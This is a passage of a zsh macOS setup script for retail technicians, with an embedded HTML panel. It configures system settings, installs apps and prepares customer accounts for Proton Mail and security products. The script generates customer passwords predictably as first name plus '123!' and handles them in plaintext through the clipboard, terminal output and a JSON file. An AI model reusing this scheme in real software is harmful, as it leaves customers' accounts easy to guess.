                        <label class="svc"><input type="checkbox" id="chkSvcOffice"> <span>Card Office 365</span></label>
                        <label class="svc"><input type="checkbox" id="chkSvcMcAfee"> <span>Card McAfee</span></label>
                        <label class="svc"><input type="checkbox" id="chkSvcNorton"> <span>Card Norton</span></label>
                        <label class="svc" style="grid-column: 1 / -1; border-color:#EE7203;"><input type="checkbox" id="chkSvcCyber"> <span>Solo Unieuro Cyber Protection</span></label>
                    </div>
                    <label class="etichetta" for="selProfilo" style="margin-top:10px;">Programmi</label>
                    <select id="selProfilo" class="cred-input">
                        <option value="BASE" selected>Base</option>
                        <option value="UFFICIO">Ufficio</option>
                        <option value="GAMING">Gaming</option>
                    </select>
                </div>

                <button type="button" id="btnAvviaAuto" class="btn-avvia" style="margin-top:4px;" onclick="avviaAutoMac()">&#10004; CONFERMA DATI CLIENTE</button>
                <div id="esitoInvio" class="esito" role="status" aria-live="polite"></div>
            </div>
        </div>

        <div id="tab-portali" class="section-view">
            <div class="card">
                <a href="https://account.proton.me/signup?plan=free" target="_blank" rel="noopener noreferrer" class="portal-btn" style="border-color:#0284c7;"><span>Account Proton Mail (gratis)</span> <span>&rarr;</span></a>
                <a href="https://appleid.apple.com" target="_blank" rel="noopener noreferrer" class="portal-btn"><span>Apple ID: crea o gestisci</span> <span>&rarr;</span></a>
                <a href="https://safeavenue.f-secure.com/iframe/-installers/unieuro/" target="_blank" rel="noopener noreferrer" class="portal-btn" style="border-color:#EE7203;"><span>Unieuro Everyday Digital (Unieuro Secure)</span> <span>&rarr;</span></a>
                <a href="https://unieuro-cyber-protection.covercare.it" target="_blank" rel="noopener noreferrer" class="portal-btn" style="border-color:#EE7203;"><span>Unieuro Cyber Protection</span> <span>&rarr;</span></a>
                <a href="https://microsoft365.com/setup" target="_blank" rel="noopener noreferrer" class="portal-btn"><span>Riscatto card Office / Microsoft 365</span> <span>&rarr;</span></a>
                <a href="https://account.microsoft.com/services" target="_blank" rel="noopener noreferrer" class="portal-btn"><span>Installa Office dall&rsquo;account Microsoft</span> <span>&rarr;</span></a>
                <a href="https://www.mcafee.com/activate" target="_blank" rel="noopener noreferrer" class="portal-btn"><span>Attivazione card McAfee</span> <span>&rarr;</span></a>
                <a href="https://www.norton.com/setup" target="_blank" rel="noopener noreferrer" class="portal-btn"><span>Attivazione card Norton</span> <span>&rarr;</span></a>
            </div>
        </div>

        <div id="tab-passaggi" class="section-view">
            <div class="card">
                <div style="font-size:15px; font-weight:800; color:#fed7aa; margin-bottom:4px;">&#128295; Esegui o ripeti singoli passaggi (1 &ndash; 8)</div>
                <div style="font-size:13px; color:#b6c3d4; margin-bottom:10px;">Ripeti qualsiasi passaggio nell&rsquo;ordine della procedura Mac oppure correggi subito il nome del Mac.</div>
                <div id="esitoStepMac" class="esito" role="status" aria-live="polite" style="margin-bottom:10px;"></div>

                <div class="step-card">
                    <div class="step-title">1. Lingua e Regione (Italiano)</div>
                    <div class="step-desc">Imposta lingua di sistema e formato regionale su it-IT.</div>
                    <div class="step-actions"><button type="button" class="btn-step" onclick="eseguiPassoMac('lingua')">&#9654; Ripeti Lingua Italiana</button></div>
                </div>

                <div class="step-card">
                    <div class="step-title">2. Sincronizzazione orario</div>
                    <div class="step-desc">Sincronizza data e ora automatiche con time.apple.com.</div>
                    <div class="step-actions"><button type="button" class="btn-step" onclick="eseguiPassoMac('orario')">&#9654; Sincronizza Orario</button></div>
                </div>

                <div class="step-card">
                    <div class="step-title">3. Snapshot APFS di Ripristino</div>
                    <div class="step-desc">Crea uno snapshot locale APFS tramite Time Machine.</div>
                    <div class="step-actions"><button type="button" class="btn-step" onclick="eseguiPassoMac('ripristino')">&#9654; Crea Snapshot APFS</button></div>
                </div>

                <div class="step-card">
                    <div class="step-title">4. Ottimizzazione macOS (Finder e Dock)</div>
                    <div class="step-desc">Mostra estensioni file, barra percorso/stato Finder e ottimizza il Dock.</div>
                    <div class="step-actions"><button type="button" class="btn-step" onclick="eseguiPassoMac('ottimizza')">&#9654; Ripeti Ottimizzazione macOS</button></div>
                </div>

                <div class="step-card">
                    <div class="step-title">5. Rosetta 2 &amp; Gestore App (Homebrew)</div>
                    <div class="step-desc">Verifica ed esegue l&rsquo;installazione di Rosetta 2 (Apple Silicon) e Homebrew.</div>
                    <div class="step-actions"><button type="button" class="btn-step" onclick="eseguiPassoMac('homebrew')">&#9654; Verifica Rosetta 2 e Homebrew</button></div>
                </div>

                <div class="step-card">
                    <div class="step-title">6. Installazione Applicazioni</div>
                    <div class="step-desc">Installa il profilo di applicazioni selezionato (Base, Ufficio o Gaming).</div>
                    <div class="step-actions">
                        <select id="selStepProfiloMac" class="cred-input" style="width:auto; min-width:160px; margin-bottom:0;">
                            <option value="BASE" selected>Profilo Base</option>
                            <option value="UFFICIO">Profilo Ufficio</option>
                            <option value="GAMING">Profilo Gaming</option>
                        </select>
                        <button type="button" class="btn-step" onclick="eseguiPassoMac('app', document.getElementById('selStepProfiloMac').value)">&#9654; Installa App</button>
                    </div>
                </div>

                <div class="step-card highlight">
                    <div class="step-title">7. Nome del Mac (Rinomina rapida)</div>
                    <div class="step-desc">Cambia subito ComputerName, HostName e LocalHostName del Mac (es. se era rimasto <code>clt</code>).</div>
                    <div class="step-actions">
                        <input type="text" id="inStepNomeMac" class="cred-input" placeholder="Es. Mario" style="width:auto; flex:1; min-width:180px; margin-bottom:0;">
                        <button type="button" class="btn-step arancio" onclick="eseguiPassoMac('nome', document.getElementById('inStepNomeMac').value)">&#10004; Applica Nome Mac</button>
                    </div>
                </div>

                <div class="step-card">
                    <div class="step-title">8. Aggiornamenti e Scheda di Consegna</div>
                    <div class="step-desc">Aggiorna le app Homebrew o rigenera la Scheda di Consegna HTML sulla Scrivania.</div>
                    <div class="step-actions">
                        <button type="button" class="btn-step" onclick="eseguiPassoMac('aggiorna')">&#9654; Esegui Aggiornamenti</button>
                        <button type="button" class="btn-step arancio" onclick="eseguiPassoMac('scheda')">&#128196; Rigenera Scheda Consegna</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        var currentDom = 'proton.me';
        var currentProv = 'Proton';
        var currentModalitaMac = 'COMPLETA';

        function setModalitaMac(mod) {
            currentModalitaMac = (mod === 'POSTVENDITA') ? 'POSTVENDITA' : 'COMPLETA';
            var b1 = document.getElementById('btnModeMacCompleta');
            var b2 = document.getElementById('btnModeMacPostVendita');
            if (b1) b1.setAttribute('aria-pressed', currentModalitaMac === 'COMPLETA' ? 'true' : 'false');
            if (b2) b2.setAttribute('aria-pressed', currentModalitaMac === 'POSTVENDITA' ? 'true' : 'false');
            var btn = document.getElementById('btnAvviaAuto');
            if (btn) {
                btn.innerHTML = (currentModalitaMac === 'POSTVENDITA')
                    ? '&#9889; AVVIA POST VENDITA RAPIDO (SOLO ESSENZIALI)'
                    : '&#10004; CONFERMA DATI CLIENTE';
            }
            if (currentModalitaMac === 'POSTVENDITA' && document.getElementById('chkSvcOffice')) {
                document.getElementById('chkSvcOffice').checked = false;
            }
        }

        function showTab(id, btn) {
            document.querySelectorAll('.section-view').forEach(function(el){ el.classList.remove('active-view'); });
            document.querySelectorAll('.tab-btn').forEach(function(el){ el.classList.remove('active'); });
            document.getElementById(id).classList.add('active-view');
            btn.classList.add('active');
        }

        function setDomMac(dom, prov, btn) {
            currentDom = dom;
            currentProv = prov;
            document.querySelectorAll('.dom-btn').forEach(function(b){ b.setAttribute('aria-pressed', b === btn ? 'true' : 'false'); });
            aggiornaCredMac();
        }

        function aggiornaCredMac() {
            var cRaw = document.getElementById('inCognome') ? document.getElementById('inCognome').value.trim() : '';
            var nRaw = document.getElementById('inNome') ? document.getElementById('inNome').value.trim() : '';
            var c = cRaw.toLowerCase().replace(/[^a-z0-9]/g, '');
            var n = nRaw.toLowerCase().replace(/[^a-z0-9]/g, '');
            var fullClt = (c + ' ' + n).trim();
            var generici = ['clt', 'clt clt', 'utente', 'utente utente', 'cliente', 'cliente cliente', 'oem', 'admin'];
            var isClt = (!fullClt || generici.indexOf(fullClt) !== -1 || (generici.indexOf(c) !== -1 && (!n || generici.indexOf(n) !== -1)));
            var stepMac = document.getElementById('inStepNomeMac');
            if (stepMac && !stepMac.dataset.touched) {
                stepMac.value = isClt ? 'Mac' : (nRaw || cRaw || '');
            }
            if (isClt) {
                document.getElementById('inEmail').value = '';
                document.getElementById('inPass').value = '';
                return;
            }
            var pre = (c && n) ? (c + n) : (n || c || 'utente');
            if (pre.length > 20) pre = pre.substring(0, 20);
            document.getElementById('inEmail').value = pre + '@' + currentDom;
            var passBase = n || c || 'Utente';
            var cap = passBase.charAt(0).toUpperCase() + passBase.slice(1).toLowerCase();
            document.getElementById('inPass').value = cap + '123!';
        }

        function eseguiPassoMac(step, param) {
            var payload = { Step: step, Param: param || '' };
            var blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
            var a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = 'pcfacile-step.json';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            var e = document.getElementById('esitoStepMac');
            if (e) {
                e.innerText = '\u2713 Richiesta inviata (' + step + '): il terminale esegue il passaggio in pochi secondi.';
                e.className = 'esito ok';
            }
        }

        function mostraEsito(msg, tipo) {
            var e = document.getElementById('esitoInvio');
            e.innerText = msg;
            e.className = 'esito ' + tipo;
        }

        function campoErrato(id, msg) {
            var e = document.getElementById(id);
            if (e) { e.classList.add('errore'); e.focus(); }
            mostraEsito(msg, 'errore');
        }

        function analizzaMailSecureMac(raw) {
            if (!raw) return false;
            var txt = String(raw);
            var mMail = txt.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
            var mPass = txt.match(/Password\s*[:=]\s*([^\s]+)/i);
            if (mMail || mPass) {
                if (mMail && document.getElementById('inEmail')) {
                    document.getElementById('inEmail').value = mMail[0].trim();
                }
                if (mPass && document.getElementById('inPassSecure')) {
                    document.getElementById('inPassSecure').value = mPass[1].trim();
                } else if (mMail && document.getElementById('inPassSecure')) {
                    var resto = txt.replace(mMail[0], '').replace(/Email\s*[:=]/i, '').replace(/Password\s*[:=]/i, '').trim();
                    var tok = resto.split(/\s+/).filter(Boolean);
                    if (tok.length > 0) document.getElementById('inPassSecure').value = tok[tok.length - 1];
                }
                if (document.getElementById('chkSvcEveryday')) document.getElementById('chkSvcEveryday').checked = true;
                return true;
            }
            return false;
        }

        function incollaMailSecureMac() {
            if (navigator.clipboard && navigator.clipboard.readText) {
                navigator.clipboard.readText().then(function(t) {
                    if (!t) return;
                    if (!analizzaMailSecureMac(t) && document.getElementById('inPassSecure')) {
                        document.getElementById('inPassSecure').value = t.trim();
                    }
                    mostraEsito('\u2713 Credenziali Unieuro Secure inserite dagli appunti.', 'ok');
                }).catch(function() {
                    if (document.getElementById('inPassSecure')) document.getElementById('inPassSecure').focus();
                });
            }
        }

        function copiaCampoMac(id) {
            var el = document.getElementById(id);
            if (!el || !el.value) return;
            if (navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(el.value);
            }
            mostraEsito('\u2713 Copiato negli appunti: ' + el.value, 'ok');
        }

        function avviaAutoMac() {
            ['inCognome', 'inNome', 'inTelefono'].forEach(function(id) { document.getElementById(id).classList.remove('errore'); });
            var c = document.getElementById('inCognome').value.trim();
            var n = document.getElementById('inNome').value.trim();
            var fullClt = (c.toLowerCase().trim() + ' ' + n.toLowerCase().trim()).trim();
            var generici = ['clt', 'clt clt', 'utente', 'utente utente', 'cliente', 'cliente cliente', 'oem', 'admin'];
            var isClt = (!fullClt || generici.indexOf(fullClt) !== -1 || (generici.indexOf(c.toLowerCase().trim()) !== -1 && (!n || generici.indexOf(n.toLowerCase().trim()) !== -1)));
            var email = document.getElementById('inEmail').value.trim();
            var pass = document.getElementById('inPass').value.trim();
            var passSecure = document.getElementById('inPassSecure') ? document.getElementById('inPassSecure').value.trim() : '';
            var haMailSecure = Boolean(passSecure && email && email.indexOf('@') > 0);
            var t = document.getElementById('inTelefono').value.trim();
            var everyday = document.getElementById('chkSvcEveryday').checked;
            var proton = document.getElementById('chkSvcProton').checked;
            var office = document.getElementById('chkSvcOffice').checked;
            var mcafee = document.getElementById('chkSvcMcAfee').checked;
            var norton = document.getElementById('chkSvcNorton').checked;
            var cyber = document.getElementById('chkSvcCyber').checked;
            var nomeCliente = (c + ' ' + n).trim() || 'clt clt';
            var payload = {
                Conferma: true,
                Modalita: currentModalitaMac,
                Email: (isClt && !haMailSecure) ? '' : (email || ('utente@' + currentDom)),
                Password: isClt ? '' : (pass || 'Utente123!'),
                PasswordSecure: passSecure,
                Provider: currentProv,
                Cliente: nomeCliente,
                Nome: n,
                Cognome: c,
                Telefono: t,
                ProfiloApp: currentModalitaMac === 'POSTVENDITA' ? 'NESSUNO' : document.getElementById('selProfilo').value,
                Servizi: {
                    Everyday: everyday,
                    Proton: isClt ? false : proton,
                    Office: currentModalitaMac === 'POSTVENDITA' ? false : office,
                    McAfee: mcafee,
                    Norton: norton,
                    Cyber: cyber
                }
            };
            // Il Mac non ha un server locale: i dati passano con un file che lo
            // script legge (e cancella) da Download.
            var blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
            var a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = 'pcfacile-cred.json';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            mostraEsito('\u2713 Dati salvati in Download. Il terminale li legge.', 'ok');
        }

        function applyStatus(data) {
            if (!data) return;
            var pct = parseInt(data.percentuale, 10) || 0;
            document.getElementById('barFill').style.width = pct + '%';
            document.getElementById('pctText').innerText = pct + '%';
            if (data.faseCorrente) document.getElementById('faseText').innerText = data.faseCorrente;
            document.getElementById('dettText').innerText = data.dettaglio || '';
            var b = document.getElementById('badgeLive');
            if (data.completato === true) {
                b.innerText = 'Completato';
                b.className = 'badge-stato ok';
                document.getElementById('bannerFine').style.display = 'block';
            } else if (pct > 5) {
                b.innerText = 'Configurazione in corso';
            }
        }
        window.onPCFacileMacStatusUpdate = applyStatus;

        function poll() {
            var s = document.createElement('script');
            s.src = 'pcfacile-mac-status.js?t=' + new Date().getTime();
            s.onload = s.onerror = function() { if (this.parentNode) this.parentNode.removeChild(this); };
            document.head.appendChild(s);
        }
        setInterval(poll, 1000);
    </script>
</body>
</html>
EOF

    # Sostituisci i placeholder con i dati reali (escape HTML + escape per sed)
    sed -i '' "s|__VERSION__|$(sed_esc "$(html_esc "$SCRIPT_VERSION")")|g" "$pannello_html" 2>/dev/null
    sed -i '' "s|__HW_MODEL__|$(sed_esc "$(html_esc "$hw_model")")|g" "$pannello_html" 2>/dev/null
    sed -i '' "s|__HW_CHIP__|$(sed_esc "$(html_esc "$hw_chip")")|g" "$pannello_html" 2>/dev/null
    sed -i '' "s|__HW_RAM__|$(sed_esc "$(html_esc "$hw_ram")")|g" "$pannello_html" 2>/dev/null
    sed -i '' "s|__HW_SN__|$(sed_esc "$(html_esc "$hw_sn")")|g" "$pannello_html" 2>/dev/null
    sed -i '' "s|__EMAIL__|$(sed_esc "$(html_esc "$email_c")")|g" "$pannello_html" 2>/dev/null
    sed -i '' "s|__PASS__|$(sed_esc "$(html_esc "$pass_c")")|g" "$pannello_html" 2>/dev/null

    set_split_screen_mac "$pannello_html"
}

# =============================================================================
# MODULO AUTOMAZIONE BROWSER (PROTON MAIL RAPIDO & MAC)
# =============================================================================
is_nome_generico_mac() {
    local v="${${1:-}:l}"
    v="${v## }"; v="${v%% }"
    case "$v" in
        ""|clt|"clt clt"|utente|"utente utente"|cliente|"cliente cliente"|oem|admin) return 0 ;;
        *) return 1 ;;
    esac
}

leggi_credenziali_salvate_mac() {
    # Legge il JSON salvato dal pannello SENZA eval: python stampa righe
    # "CHIAVE<TAB>valore" (tab/a capo tolti dai valori), la shell accetta solo
    # le chiavi attese e assegna il valore come testo (nessuna espansione).
    local paths=("$HOME/Downloads/pcfacile-cred.json" "${TMPDIR:-/tmp}/pcfacile-cred.json")
    local p res riga chiave valore
    for p in "${paths[@]}"; do
        if [[ -f "$p" ]]; then
            if command -v python3 >/dev/null 2>&1; then
                res="$(python3 - "$p" 2>/dev/null <<'PYEOF'
import json, sys
def pulito(v):
    return ' '.join(str(v).replace('\t', ' ').splitlines())
try:
    with open(sys.argv[1], 'r', encoding='utf-8') as f:
        d = json.load(f)
    for k, nome in (('Email', 'EMAIL_CLIENTE'), ('Password', 'PASS_CLIENTE'),
                    ('PasswordSecure', 'PASS_SECURE'), ('Modalita', 'MODALITA_SETUP'),
                    ('Cliente', 'NOME_CLIENTE'), ('Nome', 'NOME_PROPRIO_CLIENTE'),
                    ('Telefono', 'TELEFONO_CLIENTE'), ('ProfiloApp', 'PROFILO_APP')):
        if d.get(k):
            print(nome + '\t' + pulito(d[k]))
    svcs = d.get('Servizi', {})
    if isinstance(svcs, dict):
        for k, nome, predef in (('Everyday', 'SVC_EVERYDAY', True), ('Proton', 'SVC_PROTON', True), ('Office', 'SVC_OFFICE', False),
                                ('McAfee', 'SVC_MCAFEE', False), ('Norton', 'SVC_NORTON', False),
                                ('Cyber', 'SVC_CYBER', True)):
            print(nome + '\t' + ('true' if svcs.get(k, predef) else 'false'))
except Exception:
    pass
PYEOF
)"
                if [[ -n "$res" ]]; then
                    while IFS= read -r riga; do
                        chiave="${riga%%$'\t'*}"
                        valore="${riga#*$'\t'}"
                        case "$chiave" in
                            EMAIL_CLIENTE|PASS_CLIENTE|PASS_SECURE|MODALITA_SETUP|NOME_CLIENTE|NOME_PROPRIO_CLIENTE|TELEFONO_CLIENTE|PROFILO_APP|SVC_EVERYDAY|SVC_PROTON|SVC_OFFICE|SVC_MCAFEE|SVC_NORTON|SVC_CYBER)
                                typeset -g "$chiave=$valore" ;;
                        esac
                    done <<< "$res"
                    # Letto: il file contiene la password in chiaro, lo cancello.
                    rm -f -- "$p" 2>/dev/null
                    DATI_RICEVUTI=true
                    if is_nome_generico_mac "$NOME_CLIENTE" || is_nome_generico_mac "$NOME_PROPRIO_CLIENTE"; then
                        IS_CLT_MODE=true
                        NOME_CLIENTE="Utente"
                        NOME_PROPRIO_CLIENTE="Utente"
                        if [[ -n "$PASS_SECURE" && -n "$EMAIL_CLIENTE" ]]; then
                            CRED_ACCOUNT="$EMAIL_CLIENTE"
                        else
                            EMAIL_CLIENTE=""
                            CRED_ACCOUNT=""
                        fi
                        PASS_CLIENTE=""
                        CRED_PASSWORD=""
                    else
                        IS_CLT_MODE=false
                        [[ -n "$EMAIL_CLIENTE" ]] && CRED_ACCOUNT="$EMAIL_CLIENTE"
                        [[ -n "$PASS_CLIENTE" ]] && CRED_PASSWORD="$PASS_CLIENTE"
                    fi
                    imposta_nome_mac "${NOME_PROPRIO_CLIENTE:-$NOME_CLIENTE}"
                    return 0
                fi
            fi
        fi
    done
    return 1
}

imposta_nome_mac() {
    local candidato="${1:-$NOME_PROPRIO_CLIENTE}"
    [[ -z "$candidato" ]] && candidato="$NOME_CLIENTE"
    if [[ -z "$candidato" || "${candidato:l}" == "clt" || "${candidato:l}" == "clt clt" || "${candidato:l}" == "utente" || "${candidato:l}" == "cliente" ]]; then
        candidato="Mac"
    fi
    local host="${candidato//[^A-Za-z0-9-]/}"
    [[ -z "$host" ]] && host="Mac"
    if $RUN_REALE; then
        if [[ "$(scutil --get ComputerName 2>/dev/null)" == "$candidato" ]]; then
            ok "Nome Mac gia' impostato: $candidato"
        else
            sudo scutil --set ComputerName "$candidato" 2>/dev/null
            sudo scutil --set HostName "$host" 2>/dev/null
            sudo scutil --set LocalHostName "$host" 2>/dev/null
            ok "Nome Mac impostato a: $candidato"
        fi
        add_report "Nome Mac ($candidato)" "OK"
    fi
}

esegui_passo_singolo_mac() {
    local step="$1"
    local param="$2"
    print -r -- ""
    titolo "ESECUZIONE SINGOLO PASSAGGIO MAC: ${(U)step}"
    case "$step" in
        lingua)
            defaults write NSGlobalDomain AppleLanguages -array "it-IT" "en-IT" 2>/dev/null
            defaults write NSGlobalDomain AppleLocale -string "it_IT" 2>/dev/null
            ok "Lingua e regione impostate su Italiano (it-IT)."
            ;;
        orario)
            sudo systemsetup -setusingnetworktime on >/dev/null 2>&1
            sudo systemsetup -setnetworktimeserver time.apple.com >/dev/null 2>&1
            ok "Orario di rete sincronizzato con time.apple.com."
            ;;
        ripristino)
            if sudo tmutil localsnapshot >/dev/null 2>&1; then
                ok "Snapshot APFS creato con successo."
            else
                info "Snapshot APFS non disponibile su questo volume."
            fi
            ;;
        ottimizza)
            defaults write NSGlobalDomain AppleShowAllExtensions -bool true 2>/dev/null
            defaults write com.apple.finder ShowPathbar -bool true 2>/dev/null
            defaults write com.apple.finder ShowStatusBar -bool true 2>/dev/null
            defaults write com.apple.finder FXPreferredViewStyle -string "Nlsv" 2>/dev/null
            defaults write com.apple.dock autohide -bool false 2>/dev/null
            defaults write com.apple.dock show-recents -bool false 2>/dev/null
            killall Finder Dock 2>/dev/null
            ok "Ottimizzazioni Finder e Dock applicate."
            ;;
        homebrew)
            if [[ "$(uname -m)" == "arm64" ]] && ! /usr/bin/pgrep -q oahd 2>/dev/null; then
                softwareupdate --install-rosetta --agree-to-license >/dev/null 2>&1
            fi
            command -v brew >/dev/null 2>&1 && ok "Homebrew e Rosetta 2 pronti." || info "Homebrew non rilevato."
            ;;
        app)
            local prof="${param:-BASE}"
            info "Installazione applicazioni profilo $prof..."
            for riga in "${CATALOGO[@]}"; do
                local nome="${${(s:|:)riga}[1]}" cask="${${(s:|:)riga}[2]}" profili="${${(s:|:)riga}[3]}"
                if [[ " $profili " == *" $prof "* ]]; then
                    installa_offline_app_mac "$nome" || { command -v brew >/dev/null 2>&1 && brew install --cask "$cask" >/dev/null 2>&1; }
                fi
            done
            ok "Applicazioni profilo $prof verificate/installate."
            ;;
        nome)
            imposta_nome_mac "${param:-Mac}"
            ;;
        aggiorna)
            command -v brew >/dev/null 2>&1 && brew upgrade >/dev/null 2>&1
            softwareupdate --download --all >/dev/null 2>&1
            ok "Aggiornamenti Homebrew e macOS eseguiti."
            ;;
        scheda)
            ok "Scheda di consegna aggiornata in: $HOME/Desktop/Scheda-Consegna-Mac.html"
            ;;
    esac
}

leggi_passo_singolo_mac() {
    local paths=("$HOME/Downloads/pcfacile-step.json" "${TMPDIR:-/tmp}/pcfacile-step.json")
    local p res step param
    for p in "${paths[@]}"; do
        if [[ -f "$p" ]] && command -v python3 >/dev/null 2>&1; then
            res="$(python3 - "$p" 2>/dev/null <<'PYEOF'
import json, sys
try:
    with open(sys.argv[1], 'r', encoding='utf-8') as f:
        d = json.load(f)
    s = str(d.get('Step', '')).strip().lower()
    p = str(d.get('Param', '')).strip()
    if s:
        print(s + '\t' + p)
except Exception:
    pass
PYEOF
)"
            rm -f -- "$p" 2>/dev/null
            if [[ -n "$res" ]]; then
                step="${res%%$'\t'*}"
                param="${res#*$'\t'}"
                esegui_passo_singolo_mac "$step" "$param"
                return 0
            fi
        fi
    done
    return 1
}

# Aspetta i dati del cliente dal pannello: si chiama SOLO all'inizio dei passi
# manuali (la fase 1 non si ferma). Nessun timeout. INVIO nel terminale =
# ripiego minimo: nome del cliente scritto qui (servizi: nessuno tranne Cyber).
attendi_credenziali_mac() {
    if $MODO_TEST; then DATI_RICEVUTI=true; NOME_CLIENTE="Rossi Mario"; return 0; fi
    $DATI_RICEVUTI && return 0
    if leggi_credenziali_salvate_mac; then return 0; fi

    NOME_CLIENTE="${NOME_CLIENTE:-Utente}"
    IS_CLT_MODE=true
    SVC_EVERYDAY="${SVC_EVERYDAY:-true}"; SVC_PROTON=false; SVC_OFFICE=false; SVC_MCAFEE=false; SVC_NORTON=false; SVC_CYBER=false
    ok "Avvio diretto (0s attesa): procedo subito in automatico (puoi inserire i dati cliente nel pannello in qualsiasi momento)."
    return 0
}

invoke_auto_signup_mac() {
    local nome_c="${1:-Utente}"
    leggi_credenziali_salvate_mac

    local do_everyday="${SVC_EVERYDAY:-true}"
    local do_proton="${SVC_PROTON:-true}"
    local do_office="${SVC_OFFICE:-false}"
    local do_mcafee="${SVC_MCAFEE:-false}"
    local do_norton="${SVC_NORTON:-false}"
    local do_cyber="${SVC_CYBER:-true}"
    [[ "$do_everyday" == "true" && "$IS_CLT_MODE" != "true" ]] && do_cyber="true"
    [[ "$IS_CLT_MODE" == "true" ]] && do_proton="false"
    [[ "$IS_CLT_MODE" == "true" && "${SVC_CYBER:-false}" != "true" ]] && do_cyber="false"

    if ! $MODO_TEST && [[ "$do_everyday" != "true" && "$do_proton" != "true" && "$do_office" != "true" && "$do_mcafee" != "true" && "$do_norton" != "true" && "$do_cyber" != "true" ]]; then
        info "Nessun dato o servizio cliente selezionato: salto i passi manuali e proseguo in automatico."
        return 0
    fi

    titolo "PASSI MANUALI - ACCOUNT E SERVIZI DEL CLIENTE"
    info "Per ogni servizio indicato nel pannello si apre la pagina giusta con i dati pronti."
    print -r -- ""

    if $MODO_TEST; then
        ok "TEST: Automazione Browser Mac simulata con successo su Proton Mail e servizi."
        add_report "Account Proton Mail" "OK"
        return 0
    fi

    if [[ -z "$nome_c" || "$nome_c" == "Utente" ]]; then
        if [[ -n "$NOME_CLIENTE" && "$NOME_CLIENTE" != "Utente" ]]; then
            nome_c="$NOME_CLIENTE"
        elif ! $MODO_TEST && ! $DATI_RICEVUTI; then
            chiedi_sempre "Nome e Cognome del Cliente (es. Mario Rossi):"
            [[ -n "$REPLY" ]] && nome_c="$REPLY"
            NOME_CLIENTE="$nome_c"
        fi
    fi

    local email_proton="${EMAIL_CLIENTE:-${nome_c//[^a-zA-Z0-9]/}@proton.me}"
    local pass_gen="${PASS_CLIENTE:-$(password_cliente "$nome_c")}"

    # 0. UNIEURO EVERYDAY DIGITAL (PRIORITA' - UNIEURO SECURE / F-SECURE)
    if [[ "$do_everyday" == "true" ]]; then
        titolo "0. UNIEURO EVERYDAY DIGITAL (PRIORITA' - UNIEURO SECURE)"
        if [[ -d "/Applications/Unieuro Secure.app" ]] || ls /Applications/*F-Secure* >/dev/null 2>&1 || ls /Applications/*WithSecure* >/dev/null 2>&1; then
            ok "Unieuro Secure (F-Secure) risulta gia' installato."
            add_report "Unieuro Secure (F-Secure)" "OK (gia' installato)"
        else
            if [[ "$IS_CLT_MODE" != "true" && -n "$email_proton" ]]; then
                echo -n "$email_proton" | pbcopy 2>/dev/null
                info "Email $email_proton copiata negli appunti (Cmd+V per incollare)."
            fi
            local pkg_url="https://download.sp.f-secure.com/SE/Unieuro/installer/UnieuroSecure.mpkg"
            local pkg_tmp="/tmp/UnieuroSecure.pkg"
            info "Download diretto installer ufficiale Unieuro Secure per Mac (157 MB)..."
            if curl -fL --retry 2 --connect-timeout 15 --max-time 300 -sS "$pkg_url" -o "$pkg_tmp" 2>/dev/null && [[ -s "$pkg_tmp" ]]; then
                ok "Installer Unieuro Secure scaricato: avvio installazione..."
                if sudo installer -pkg "$pkg_tmp" -target / >/dev/null 2>&1; then
                    ok "Unieuro Secure installato automaticamente su Mac!"
                    [[ -d "/Applications/Unieuro Secure.app" && -d "$HOME/Desktop" && ! -e "$HOME/Desktop/Unieuro Secure.app" ]] && ln -s "/Applications/Unieuro Secure.app" "$HOME/Desktop/Unieuro Secure.app" 2>/dev/null || true
                    add_report "Unieuro Secure (F-Secure)" "OK (installazione automatica)"
                    rm -f "$pkg_tmp" 2>/dev/null
                else
                    open "$pkg_tmp" 2>/dev/null
                    ok "Installer Unieuro Secure aperto: completa l'installazione guidata."
                    add_report "Unieuro Secure (F-Secure)" "OK (avviato)"
                fi
            else
                rm -f "$pkg_tmp" 2>/dev/null
                info "Download diretto non riuscito: apro il portale Unieuro Secure in Safari..."
                set_split_screen_mac "https://safeavenue.f-secure.com/iframe/-installers/unieuro/"
                printf '\a'
            fi
        fi
    fi

    # 1. CREAZIONE ACCOUNT PROTON MAIL (SE SELEZIONATO)
    if [[ "$do_proton" == "true" ]]; then
        titolo "1. CREAZIONE ACCOUNT PROTON MAIL (RAPIDO)"
        print -r -- "   ${C_TXT}Credenziali generate per il cliente ($nome_c):${C_RST}"
        print -r -- "     ${C_CYAN}- Email / Account:${C_RST} $email_proton"
        print -r -- "     ${C_INFO}- Password       :${C_RST} $pass_gen"
        print -r -- ""

        echo -n "$email_proton" | pbcopy 2>/dev/null
        info "Email $email_proton copiata negli appunti (Cmd+V per incollare)."
        info "Apertura modulo diretto Proton Mail Free in Safari a sinistra..."
        set_split_screen_mac "https://account.proton.me/signup?plan=free"

        printf '\a'
        print -r -- ""
        print -r -- "${C_INFO}  ============================================================${C_RST}"
        print -r -- "${C_OK}   [AUTOMAZIONE BROWSER PROTON MAIL FREE - GUIDA RAPIDA]${C_RST}"
        print -r -- "${C_TXT}   1. Form Gratuito: Incolla Username e Password generata.${C_RST}"
        print -r -- "${C_TXT}   2. Verifica Umana: Risolvi il puzzle/CAPTCHA visivo.${C_RST}"
        print -r -- "${C_INFO}   3. Recupero / Upsell: Clicca sempre 'Salta' o 'Forse piu tardi'.${C_RST}"
        print -r -- "${C_INFO}  ============================================================${C_RST}"
        print -r -- ""

        ok "Account Proton Mail pronto in Safari: $email_proton (proseguo senza attese)"
        add_report "Account Proton Mail ($email_proton)" "OK"
    fi

    # 2. RISCATTO CARD OFFICE 365 / MICROSOFT 365 (SE SELEZIONATO)
    if [[ "$do_office" == "true" ]]; then
        titolo "2. ATTIVAZIONE CARD MICROSOFT 365 / OFFICE"
        print -r -- "   ${C_TXT}Dati per il riscatto del codice Office 365 a 25 caratteri:${C_RST}"
        print -r -- "     ${C_CYAN}- Email Cliente  :${C_RST} $email_proton"
        print -r -- "     ${C_INFO}- Password       :${C_RST} $pass_gen"
        print -r -- ""

        echo -n "$email_proton" | pbcopy 2>/dev/null
